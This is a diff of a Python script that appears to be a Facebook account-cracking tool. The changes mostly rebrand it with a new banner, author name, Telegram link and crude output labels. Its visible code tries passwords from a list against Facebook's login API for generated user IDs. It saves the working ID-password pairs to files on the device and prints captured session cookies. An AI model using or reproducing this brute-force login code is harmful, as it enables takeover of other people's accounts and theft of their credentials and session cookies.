@@ -47,13 +47,18 @@ def ____banner____():
     else:os.system("clear")
     print(f"""\033[1;32m
     
- \x1b[37;41m\t IM BRAND\x1b[0;m\n\n\x1b[1;37m                              
+▗▄▄▖  ▗▄▖ ▗▄▄▖ ▗▖  ▗▖    ▗▖ ▗▖▗▖ ▗▖▗▄▄▖ 
+▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌    ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌
+▐▛▀▘ ▐▌ ▐▌▐▛▀▚▖▐▌ ▝▜▌    ▐▛▀▜▌▐▌ ▐▌▐▛▀▚▖
+▐▌   ▝▚▄▞▘▐▌ ▐▌▐▌  ▐▌    ▐▌ ▐▌▝▚▄▞▘▐▙▄▞▘
+                                                                                                                                                             
+ \x1b[37;41m\t ♥I♥M♥ B♥R♥A♥N♥D♥\x1b[0;m\n\n\x1b[1;37m                              
 \n---------------------------------
-\033[1;93m\033[1;93m 
-\033[1;91m  AUTHOR   : 
-\033[1;91m  GITHUB   :           
-\033[1;91m  WHATSAPP : +      
-\033[1;91m  TOOLS    : \033[1;32m \033[1;37m                         
+\033[1;93m\033[1;93m Emon
+\033[1;91m  AUTHOR   : Emon
+\033[1;91m  GITHUB   :         Emon
+\033[1;91m  WHATSAPP : +    X
+\033[1;91m  TOOLS    : \033[1;32m FREE \033[1;37m                         
 \033[1;91m  VERSION  :   \033[1;35m     2025                                                                            
 \033[1;93m\033[1;93m """)
     
@@ -85,7 +90,7 @@ def main():
 
 def fuckMyxAXN(series):
     ____banner____()
-    #os.system("xdg-open https://t.me/ROOTJAHID")
+    #os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
     global gen
     if series == "100000":
         SEX = "100000"
@@ -112,7 +117,7 @@ def fuckMyxAXN(series):
 
 def Fucking_life(ids, passlist):
     global loop, oks, cps
-    sys.stdout.write(f"\rBRD [{loop}]|OK:[{len(cps)}]")
+    sys.stdout.write(f"\rFUCK [{loop}]|OK:[{len(cps)}]")
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -121,13 +126,13 @@ def Fucking_life(ids, passlist):
             url = "https://b-api.facebook.com/auth/login"
             response = requests.post(url, data=data, headers=head, verify=True).json()
             if "access_token" in response:
-                print(f"\r\r\x1bBRD_H41N4-OK | {ids} • {pas}")
-                open("/sdcard/BRD-OK.txt", "a").write(ids + "|" + pas + "\n")
+                print(f"\r\r\x1bFUCK_H41N4-OK | {ids} • {pas}")
+                open("/sdcard/FUCK-OK.txt", "a").write(ids + "|" + pas + "\n")
                 oks.append(ids)
                 break
             elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                print(f"\r\r\x1bABRDOK | {ids} • {pas}")
-                open("/sdcard/BRD-OK.txt", "a").write(ids + "|" + pas + "\n")
+                print(f"\r\r\x1bAFUCKOK | {ids} • {pas}")
+                open("/sdcard/FUCK-OK.txt", "a").write(ids + "|" + pas + "\n")
                 cps.append(ids)
                 break
         loop += 1
@@ -141,7 +146,7 @@ def FUCK_XNXXX():
     user=[]
     clear()
     ____banner____()
-    os.system("xdg-open https://t.me/asif_tricker95")
+    os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
     print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
     code=input(' ENTER SIM CODE >> ')
     
@@ -183,7 +188,7 @@ def FUCK_FRIEND(ids,passlist):
     global loop
     try:
         for pas in passlist:
-            sys.stdout.write(f'\r\x1b[[\x1b[₳Ӿ₦_₵Ɽ₳₵₭\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK-{len(oks)}\x1b[]')
+            sys.stdout.write(f'\r\x1b[[\x1b[R_FUCK\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK-{len(oks)}\x1b[]')
             sys.stdout.flush()
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
@@ -199,14 +204,14 @@ def FUCK_FRIEND(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[BRONEN-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[FUCK-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[3;34m [COOKIE_❇️] '+coki)
-                    open('/sdcard/BRONEN-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
+                    open('/sdcard/FUCK-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;35m[BRONEN-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
+                print('\r\r \033[1;35m[R_FUCK-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
                 open('/sdcard/BRONEN-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
